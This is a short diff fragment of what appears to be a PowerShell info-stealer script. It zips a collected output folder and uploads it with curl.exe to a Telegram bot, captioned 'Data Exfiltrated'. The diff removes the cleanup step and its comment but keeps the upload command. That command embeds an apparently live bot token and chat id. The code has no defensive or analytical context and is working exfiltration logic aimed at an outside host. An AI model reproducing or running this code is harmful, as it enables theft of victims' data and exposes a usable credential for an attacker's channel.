@@ -42,6 +42,5 @@ if (Test-Path "$env:ProgramFiles\7-Zip\7z.exe") {
     Compress-Archive -Path "$OutputFolder\*" -DestinationPath $ZipFile -Force
 }
 
-# 5. Cleanup & Telegram Exfiltration
-Remove-Item $OutputFolder -Recurse -Force
+
 curl.exe -X POST https://api.telegram.org/bot7442026925:AAHMoNtk_XagubdE96jkSt2V7mYcAZ1U-x8/sendDocument -F chat_id=5837648640 -F document=@"$ZipFile" -F caption="Data Exfiltrated"
